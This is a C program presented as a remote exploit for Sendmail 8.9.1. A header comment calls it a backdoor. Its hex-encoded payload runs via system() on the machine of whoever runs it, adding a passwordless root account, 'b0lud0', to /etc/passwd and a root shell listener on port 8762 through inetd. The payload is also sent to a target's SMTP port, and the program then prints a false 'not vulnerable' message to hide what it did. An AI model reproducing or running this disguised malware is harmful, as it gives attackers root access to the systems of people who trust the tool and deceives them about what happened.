/* 

---  -------------------------------------------  ----
         Sendmail stupid backd00r by dr_fdisk^
---  -------------------------------------------- ----

This Backdoor creates a root account "b0lud0"
and opens a remote shell in port 8762

 */
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

char shellcode[]=\
"\x65\x63\x68\x6f\x20\x74\x63\x70\x64\x6f\x6f\x72\x20\x38\x37\x36"\
"\x32\x2f\x74\x63\x70\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x73\x65"\
"\x72\x76\x69\x63\x65\x73\x3b\x65\x63\x68\x6f\x20\x74\x63\x70\x64"\
"\x6f\x6f\x72\x20\x73\x74\x72\x65\x61\x6d\x20\x74\x63\x70\x20\x6e"\
"\x6f\x77\x61\x69"\
"\x74\x20\x72\x6f\x6f\x74\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20"\
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x3e\x3e"\
"\x20\x2f\x65\x74\x63\x2f\x69\x6e\x65\x74\x64\x2e\x63\x6f\x6e\x66"\
"\x3b\x6b\x69\x6c\x6c\x61\x6c\x6c\x20\x2d\x4b\x49\x4c\x4c\x20\x69"\
"\x6e\x65\x74\x64\x3b\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f\x69"\
"\x6e\x65\x74\x64\x3b\x20\x65\x63\x68\x6f\x20\x62\x30\x6c\x75"\
"\x64\x30\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f"\
"\x73\x68\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73"\
"\x77\x64\x20\x26";


void server_smtp(char *conn22);
int conexion;
void server_smtp(char *conn22)
{
  struct sockaddr_in sin;
  struct hostent *hp;
  hp = gethostbyname(conn22);
  if (hp==NULL) {
    printf("El host %s no existe!!!!\n",conn22);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(25);
  conexion = socket(AF_INET, SOCK_STREAM, 0);
  connect(conexion,(struct sockaddr *) &sin, sizeof(sin));
}

void main(int argc, char **argv)
{
  char buffer[1500];
  int a;
char salida[50];

  if (argc != 3) {
system("clear");
printf("\n\n\n\n");
printf("[1;31mSendmail 8.9.1 Remote sh3ll[0m[0;31m[0m\n");
printf("----------------------------------------------------------------------\n\n");
printf("ex: %s vul_serv command\n\n[0m",argv[0]);
exit(0);
}

printf("[0;33mConnecting to smtp server: [1;33m%s[5m\n",argv[1]);
system(shellcode);
server_smtp(argv[1]);
sprintf(buffer,"%s\n %s",shellcode,argv[2]);

  send(conexion, buffer, strlen(buffer), 0);
  sprintf(salida, "quit\n");
  send(conexion, salida, strlen(salida), 0);

printf("[1;34!not vulnerable... exiting![0m[0;31m",a);
printf("[0m\n\n");
}
/* THIS IS THE END */
